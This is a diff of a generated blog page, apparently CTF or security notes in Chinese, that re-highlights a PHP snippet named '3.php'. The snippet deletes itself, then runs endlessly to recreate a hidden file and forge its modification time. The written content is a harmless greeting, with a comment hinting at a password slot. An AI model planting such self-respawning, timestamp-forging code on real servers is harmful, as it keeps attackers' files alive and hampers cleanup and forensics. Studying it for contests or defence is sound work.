@@ -255,7 +255,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2021年7月10日 下午
+                  本文最后更新于：2021年7月10日 晚上
                 
               </p>
             
@@ -515,7 +515,7 @@
 </li>
 <li>
 <p>3.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br>    ignore_user_abort(true);<br>    set_time_limit(0);<br>    unlink(__FILE__);<br>    $file &#x3D; &#39;.3.php&#39;;<br>    $code &#x3D; &#39;hi springbird !&#39;;<br>    &#x2F;&#x2F;pass&#x3D;pass<br>    while (1)&#123;<br>        file_put_contents($file,$code);<br>        system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#39;);<br>    &#x2F;&#x2F;    usleep(5000);<br>          usleep(1000);<br>    &#125;<br>?&gt;<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    ignore_user_abort(<span class="hljs-literal">true</span>);<br>    set_time_limit(<span class="hljs-number">0</span>);<br>    unlink(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.3.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;hi springbird !&#x27;</span>;<br>    <span class="hljs-comment">//pass=pass</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        file_put_contents(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        system(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#x27;</span>);<br>    <span class="hljs-comment">//    usleep(5000);</span><br>          usleep(<span class="hljs-number">1000</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
 </li>
 </ul>
 </li>
